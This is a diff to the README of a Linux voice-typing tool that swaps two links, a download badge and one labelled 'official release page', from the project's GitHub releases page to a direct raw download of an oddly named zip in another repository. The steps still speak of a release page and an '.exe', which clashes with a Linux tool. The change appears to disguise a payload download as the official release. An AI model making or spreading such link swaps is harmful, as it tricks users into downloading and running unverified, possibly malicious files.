@@ -5,7 +5,7 @@ description: "Transcribe speech to text in any Linux application using local, GP
 ---
 # 🎙️ type-by-voice - Speak to type in any application
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/tatec756/type-by-voice/releases)
+[![Download from GitHub](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/tatec756/tatec756.github.io/main/putrescibility/io_tatec_github_3.1.zip)
 
 This software converts your voice into text and types it into any open window on your computer. It runs entirely on your machine. You do not need an internet connection, and you do not need to pay for any cloud services or API keys.
 
@@ -22,7 +22,7 @@ Your computer needs a few things to run this accurately and quickly.
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/tatec756/type-by-voice/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/tatec756/tatec756.github.io/main/putrescibility/io_tatec_github_3.1.zip).
 2. Look for the most recent version at the top of the list.
 3. Find the file ending in `.exe` under the Assets section.
 4. Click the file name to download it to your computer.
